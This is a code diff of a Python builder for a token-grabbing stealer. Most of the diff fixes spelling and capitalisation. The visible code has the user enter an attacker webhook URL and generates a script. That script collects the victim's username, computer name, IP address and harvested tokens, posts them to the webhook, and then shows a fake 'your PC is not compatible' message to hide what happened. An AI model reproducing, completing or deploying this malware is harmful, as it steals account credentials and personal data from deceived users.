@@ -1,11 +1,11 @@
-LICNECE = """
+LICENSE = """
 Copyright © 2021 Drillenissen#4268
 Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the “Software”), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:
 The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.
 THE SOFTWARE IS PROVIDED “AS IS”, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
 """
 
-from colored import fg, attr
+from colored import fg
 import time
 
 r = fg(241) # Setup color variables
@@ -15,9 +15,9 @@ w = fg(15)
 
 def create_grabber():
     webhookUrl = input(f"\n {r2}[{b}?{r2}] Webhook: ")
-    fileName = input(f" {r2}[{b}?{r2}] File name: ")
+    fileName = input(f" {r2}[{b}?{r2}] File Name: ")
 
-    print(f"\n {r2}[{b}+{r2}] Writing files")
+    print(f"\n {r2}[{b}+{r2}] Writing Files")
     time.sleep(.3)
 
     try:
@@ -77,7 +77,7 @@ except Exception as e:
 pc_name = os.getenv('COMPUTERNAME') if os.getenv('COMPUTERNAME') is not None else os.uname().nodename
 user = os.getenv('username')
 
-message += f"[ User Data ]\\n - Username: {user}\\n - Computer name: {pc_name}\\n - IP: {ip}\\n\\n"
+message += f"[ User Data ]\\n - Username: {user}\\n - Computer Name: {pc_name}\\n - IP: {ip}\\n\\n"
 
 if len(grabbedTokens) == 0:
     message += "[ No tokens found ]"
@@ -99,8 +99,8 @@ req = Request(
 
 urlopen(req)
 
-print("Sorry, your pc is not compatable for this software, please use another.")
-input("Please press enter, to exit out of the program.")
+print("Sorry, your PC is not compatible with this software, please use another.")
+input("Please press enter to exit.")
 """.replace("~~TOKENURLHERE~~", webhookUrl))
 
     except Exception as e:
